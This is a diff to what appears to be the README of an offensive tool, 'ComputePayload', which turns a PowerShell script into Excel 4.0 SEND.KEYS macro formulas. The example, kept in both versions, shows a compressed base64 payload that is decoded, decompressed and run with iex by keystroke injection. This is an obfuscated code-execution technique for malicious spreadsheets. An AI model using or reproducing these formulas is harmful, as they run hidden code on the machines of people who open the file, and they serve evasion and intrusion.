@@ -43,15 +43,10 @@ Usage: computepayload [OPTION]... [FILE]... [-C]
 Example:
 
 ```
-.\ComputePayload.exe -e .\clear_history.ps1 -c
- 
-1. =SEND.KEYS("$b=""H4sIAAAAAAAEAJWQQWsCMRCF7wv{+}h0Es7h42h14KggeRWkvVLkbwID2k7sgGshnZjMoi/vcm7hZb8NDeMpm8L{+}{+}9XqGOmMklqtxoizCEuGcPxkDqh/gFOZ1TfjAI6fMIpDZo2dRjsqztAeEmTJJO1In0zst/ExM4dyKAsUFVpVNyHKbwboWO00xx0XxzU7zvWZNNxFQ7pqqWAeefeRAELcASSzpi{+}spYNraY9n{+}EtIQm4hAW"; TRUE)
-
-2. =SEND.KEYS("eGoxq3qPMNEh6D88BdrlR7xmGy42c72tyNGORUYnrGSBxohM{+}uocGQzcmed{+}DAZXaauMfYsXQOPwXmvfrjeydt60WOLO4DYYEyPnsPw0tefNSOVrzUWmKtbKLFSJcbdVrLXN6eTEhKrSdZOr0XsrIdHmb1g7zwvHtdIc9x/Okyd4vPSTO4l9C1/sVYH1SwIAAA=="";nal no New-Object -F;iex {(}no IO.StreamReader{(}no "; TRUE)
-
-3. =SEND.KEYS("IO.Compression.GZipStream{(}{(}no IO.MemoryStream -A @{(},{[}Convert{]}::FromBase64String{(}$b{)}{)}{)},{[}IO.Compression.CompressionMode{]}::Decompress{)}{)}{)}.ReadToEnd{(}{)}~{NUMLOCK}"; TRUE)
-
-INFO: Ready to paste.
+.\ComputePayload.exe -e .\clear_history.ps1 -c 
+=SEND.KEYS("$b=""H4sIAAAAAAAEAJWQQWsCMRCF7wv{+}h0Es7h42h14KggeRWkvVLkbwID2k7sgGshnZjMoi/vcm7hZb8NDeMpm8L{+}{+}9XqGOmMklqtxoizCEuGcPxkDqh/gFOZ1TfjAI6fMIpDZo2dRjsqztAeEmTJJO1In0zst/ExM4dyKAsUFVpVNyHKbwboWO00xx0XxzU7zvWZNNxFQ7pqqWAeefeRAELcASSzpi{+}spYNraY9n{+}EtIQm4hAW"; TRUE)
+=SEND.KEYS("eGoxq3qPMNEh6D88BdrlR7xmGy42c72tyNGORUYnrGSBxohM{+}uocGQzcmed{+}DAZXaauMfYsXQOPwXmvfrjeydt60WOLO4DYYEyPnsPw0tefNSOVrzUWmKtbKLFSJcbdVrLXN6eTEhKrSdZOr0XsrIdHmb1g7zwvHtdIc9x/Okyd4vPSTO4l9C1/sVYH1SwIAAA=="";nal no New-Object -F;iex {(}no IO.StreamReader{(}no "; TRUE)
+=SEND.KEYS("IO.Compression.GZipStream{(}{(}no IO.MemoryStream -A @{(},{[}Convert{]}::FromBase64String{(}$b{)}{)}{)},{[}IO.Compression.CompressionMode{]}::Decompress{)}{)}{)}.ReadToEnd{(}{)}~{NUMLOCK}"; TRUE)
 ```
 
 ``Book1.xls`` breakdown:
